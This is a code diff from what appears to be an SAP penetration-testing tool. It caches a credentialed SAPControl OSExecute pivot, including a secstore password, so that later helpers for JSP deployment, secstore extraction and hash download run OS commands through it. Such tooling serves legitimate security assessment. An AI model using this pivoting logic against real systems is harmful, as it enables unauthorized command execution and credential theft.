@@ -9088,6 +9088,38 @@ def create_app(api: SAPMAPApi) -> Bottle:
                                   f"reachable ({_identity}) but "
                                   f"credential validation failed — "
                                   f"{_ace}")
+                        # Cache the SAPControl pivot on the TARGET
+                        # node so execute_os_command (and every
+                        # downstream helper — _deploy_jsp_via_gw,
+                        # extract_java_secstore, download hashes,
+                        # read_table, ...) transparently routes
+                        # OS-exec calls through this channel without
+                        # threading URL/user/pwd through every
+                        # signature.  Mirrors the _cached_soap_route
+                        # pattern used for the SOAP-RFC fallback.
+                        if (conn.os_exec_verified
+                                and conn.target_sid):
+                            _tgt_cache = api.state.get_node(
+                                conn.target_sid)
+                            if _tgt_cache is not None:
+                                _tgt_cache._cached_sapcontrol_pivot = {
+                                    "url": conn.http_url or "",
+                                    "user": conn.rfc_user or "",
+                                    "password": (
+                                        conn.secstore_password
+                                        or ""),
+                                    "os_hint": (
+                                        conn.target_os_hint or ""),
+                                    "via_destination": (
+                                        conn.destination_name),
+                                    "via_source_sid": (
+                                        conn.source_sid),
+                                }
+                                print(f"[+] {dest_name}: cached "
+                                      f"SAPControl OSExecute pivot "
+                                      f"on {conn.target_sid} — "
+                                      f"downstream OS-exec now "
+                                      f"routes via {conn.http_url}")
                         # CRITICAL finding fires only when we've
                         # actually proven the credential unlocks
                         # OSExecute — a reachable-but-unauthenticated
